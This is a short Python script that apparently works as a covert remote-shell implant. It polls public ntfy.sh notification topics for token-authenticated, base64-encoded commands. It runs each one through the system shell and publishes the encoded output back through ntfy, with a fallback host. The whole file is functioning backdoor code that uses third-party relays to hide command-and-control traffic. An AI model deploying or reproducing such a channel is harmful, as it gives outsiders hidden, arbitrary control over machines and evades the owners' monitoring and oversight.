#!/usr/bin/env python3

import base64, json, subprocess, sys, time, urllib.request, uuid

_CONF = dict(l.strip().split("=", 1) for l in open("/etc/kvorix/ai.conf", encoding="utf-8") if "=" in l and not l.startswith("#"))
CMD_TOPIC = _CONF["CMD_TOPIC"]
OUT_TOPIC = _CONF["OUT_TOPIC"]
TOKEN = _CONF["TOKEN"]
HOSTS = ["https://ntfy.sh", "https://ntfy.hostux.net"]

def publish(text):
    for h in HOSTS:
        try:
            req = urllib.request.Request(h + "/" + OUT_TOPIC, data=text.encode())
            urllib.request.urlopen(req, timeout=15).read()
            return
        except Exception:
            continue

def handle(msg):
    parts = msg.split(" ", 2)
    if len(parts) < 3 or parts[0] != "CMD" or parts[1] != TOKEN:
        return
    try:
        cmd = base64.b64decode(parts[2].encode()).decode()
    except Exception:
        return
    tag = uuid.uuid4().hex[:8]
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
        out = (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        out = "ошибка: %s" % e
    out = out[:3000]
    publish("OUT %s %s" % (tag, base64.b64encode(out.encode()).decode()))

while True:
    try:
        stream = urllib.request.urlopen("https://ntfy.sh/" + CMD_TOPIC + "/json", timeout=None)
        for raw in stream:
            try:
                m = json.loads(raw.decode("utf-8", "replace"))
            except Exception:
                continue
            if m.get("event") != "message":
                continue
            handle(m.get("message", ""))
    except Exception:
        time.sleep(10)
